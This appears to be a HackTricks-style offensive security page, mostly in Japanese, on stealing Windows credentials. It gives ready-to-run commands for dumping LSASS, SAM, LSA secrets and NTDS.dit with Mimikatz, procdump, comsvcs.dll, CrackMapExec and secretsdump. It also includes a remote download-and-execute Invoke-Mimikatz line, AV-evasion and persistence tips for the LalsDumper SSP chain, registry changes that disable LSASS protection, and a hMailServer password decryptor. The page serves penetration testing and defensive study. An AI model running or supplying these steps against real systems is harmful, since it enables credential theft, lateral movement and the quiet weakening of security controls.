# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz ができる他のことは** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **これらの保護は Mimikatz がいくつかの credentials を抽出するのを防ぐ可能性があります。**

## Meterpreterでの Credentials

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **私が作成した** を使用して、被害者内の **passwords and hashes** を検索してください。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVの回避

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**ため、Defenderに検出されません。\
このツールを使うと、**dump the lsass process**、ダンプを**download the dump**し、ダンプから**extract**して**credentials locally**を抽出できます。

または [SharpDump](https://github.com/GhostPack/SharpDump) を使用することもできます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: 一部の **AV** は **procdump.exe to dump lsass.exe** の使用を **malicious** と **detect** することがあります。これは **"procdump.exe" and "lsass.exe"** という文字列を **detecting** しているためです。したがって、lsass.exe の **name** を渡す代わりに lsass.exe の **PID** を **argument** として procdump に **pass** するほうが **stealthier** です。

### **comsvcs.dll** を使った lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **dumping process memory** を行う役割を持っています。 この DLL には `MiniDumpW` という **function** が含まれており、`rundll32.exe` を使って呼び出すことを想定しています。\
最初の2つの引数は無視して構いませんが、3番目は3つの要素に分かれます。ダンプ対象のプロセスIDが第1要素、ダンプファイルの保存先が第2要素、そして第3要素は厳密に単語 **full** です。他の選択肢はありません。\
これら3つの要素を解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをそのファイルに書き込みます。\
**comsvcs.dll** を利用することで lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) を参照してください。

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **lsass を Task Manager でダンプする**

1. Task Bar を右クリックし、Task Manager をクリックします。
2. More details をクリックします。
3. Processes タブで "Local Security Authority Process" プロセスを検索します。
4. "Local Security Authority Process" プロセスを右クリックし、"Create dump file" をクリックします。

### procdump を使って lsass をダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade を使った lsass のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は Protected Process Dumper Tool で、メモリダンプを難読化し、ディスクに書き出すことなくリモートワークステーションへ転送することをサポートします。

**主な機能**:

1. PPL 保護の回避
2. Defender のシグネチャベースの検出を回避するためのメモリダンプファイルの難読化
3. RAW および SMB アップロード方式でディスクに落とすことなくメモリダンプをアップロード（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon は、`MiniDumpWriteDump` を一切呼ばない、**LalsDumper** と呼ばれる3段階の dumper を搭載しています。したがってその API に対する EDR フックは発動しません:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` の中で小文字の `d` が32個並んだプレースホルダを検索し、それを `rtu.txt` の絶対パスで上書きし、パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより **LSASS** が悪意ある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **Stage 2 inside LSASS** – LSASS が `nfdp.dll` をロードすると、その DLL は `rtu.txt` を読み取り、各バイトを `0x20` と XOR し、デコードしたブロブをメモリにマップしてから実行を移します。
3. **Stage 3 dumper** – マップされたペイロードは、ハッシュ化された API 名から解決した **direct syscalls** を使って MiniDump のロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。`Tom` という名前の専用エクスポートは `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS ダンプをそのファイルにストリームし、ハンドルを閉じて後で exfiltration できるようにします。

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt` を同じディレクトリに置いてください。Stage 1 はハードコードされたプレースホルダを `rtu.txt` の絶対パスで書き換えるため、ファイルを分散させるとチェーンが壊れます。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加することで行います。LSASS が毎回起動時に SSP を再ロードするよう、その値を予め設定できます。
* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで解凍してから Mimikatz/Volatility に渡して資格情報を抽出してください。
* `lals.exe` の実行には admin/SeTcb 権限が必要です（`AddSecurityPackageA` を成功させるため）。呼び出しが返ると、LSASS は透過的に不正な SSP をロードし、Stage 2 を実行します。
* ディスクから DLL を削除しても LSASS からは追い出されません。レジストリエントリを削除して LSASS を再起動（reboot）するか、そのまま長期的な persistence として残しておいてください。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSAシークレットのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲット DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### NTDS.dit の各アカウントの pwdLastSet 属性を表示
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**配置**されています。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。

### レジストリから

これらのファイルを入手する最も簡単な方法は、レジストリからコピーを取得することです:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
これらのファイルをあなたのKaliマシンに**ダウンロード**し、次のコマンドで**hashes を抽出**してください:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して保護されたファイルをコピーできます。Administrator の権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server のバージョンでのみ利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell** から同じことができます。これは **how to copy the SAM file** の例です（使用するハードドライブは "C:" で、C:\users\Public に保存されます）が、任意の保護されたファイルのコピーにもこれを使用できます:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍からのコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使って SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 資格情報 - NTDS.dit**

The **NTDS.dit** file は **Active Directory** の心臓部として知られており、ユーザーオブジェクト、グループ、及びそれらのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** はここに格納されます。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** に配置されています。

このデータベース内には主に三つのテーブルが保持されています:

- **Data Table**: ユーザーやグループなどのオブジェクトの詳細を格納します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を担います。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows はこのファイルとやり取りするために _Ntdsa.dll_ を使用し、_lsass.exe_ によって利用されます。したがって、**NTDS.dit** ファイルの一部は **`lsass`** のメモリ内に存在する可能性があり（パフォーマンス向上のために **cache** を使って最近アクセスしたデータが保持されていることがあるため）、そこから取得できる場合があります。

#### NTDS.dit 内の hashes の復号

ハッシュは3段階で暗号化されています:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** は **every domain controller** で **同じ値** を持ちますが、**NTDS.dit** ファイル内ではそのドメインコントローラの **SYSTEM file** の **BOOTKEY** を使って **cyphered** されています（ドメインコントローラごとに異なります）。このため、NTDS.dit ファイルから資格情報を取得するには **NTDS.dit と SYSTEM の両方のファイルが必要** です（_C:\Windows\System32\config\SYSTEM_）。

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit から hashes を抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**入手したら**、_secretsdump.py_ のようなツールを使って **hashes を抽出する**ことができます:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、**それらを自動的に抽出することもできます**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
大きな **NTDS.dit ファイル** の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することが推奨されます。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ や **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit から SQLite データベースへのドメインオブジェクト抽出**

NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。抽出されるのは秘密情報だけでなく、生の NTDS.dit ファイルが既に取得されている場合には、さらなる情報抽出のためにオブジェクト全体とその属性も含まれます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
```
lazagne.exe all
```
## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから認証情報を抽出するために使用できます。ダウンロード: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから認証情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。ただ**実行する**だけでパスワードが抽出されます。

## アイドルRDPセッションのマイニングとセキュリティ制御の弱体化

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style テレメトリ収集

* **Outbound RDP targets** – すべてのユーザーハイブを `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` で解析します。各サブキーはサーバー名、`UsernameHint`、および最終書き込みのタイムスタンプを保存します。PowerShellでFinalDraftのロジックを再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを照会し、Event ID **21**（成功したログオン）および **25**（切断）を抽出して、誰がホストを管理したかをマッピングします:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どのDomain Adminが定期的に接続しているかが判明したら、そのユーザーの**切断された**セッションがまだ存在する間にLSASSをダンプします（LalsDumper/Mimikatzを使用）。CredSSP + NTLMのフォールバックにより、検証情報とトークンがLSASSに残され、それらをSMB/WinRM経由でリプレイして`NTDS.dit`を取得したり、ドメインコントローラ上で永続化を仕掛けたりできます。

### FinalDraftが標的としたレジストリのダウングレード

同じインプラントは、資格情報窃取を容易にするためにいくつかのレジストリキーを改変します:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると RDP 中に資格情報／チケットの完全な再利用が強制され、pass-the-hash スタイルのピボットが可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC トークンフィルタを無効にし、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` により DC がオンラインの間でも DSRM 管理者がログオンできるようになり、攻撃者にとって別の組み込み高権限アカウントを提供します。
* `RunAsPPL=0` は LSASS PPL 保護を解除し、LalsDumper のようなダンプツールによるメモリアクセスを容易にします。

## hMailServer データベース資格情報（侵害後）

hMailServer は DB パスワードを `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` に保存します。値は静的キー `THIS_KEY_IS_NOT_SECRET` と 4バイト単位のワードのエンディアン交換で Blowfish 暗号化されています。INI からの16進文字列をこの Python スニペットで使用してください:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードがあれば、ファイルロックを避けるために SQL CE database をコピーし、32-bit provider をロードし、必要ならアップグレードしてから hashes をクエリします：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列は hMailServer のハッシュ形式（hashcat モード `1421`）を使用します。これらの値をクラックすることで、WinRM/SSH ピボットに再利用可能な資格情報を得られる可能性があります。

## 参考資料

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
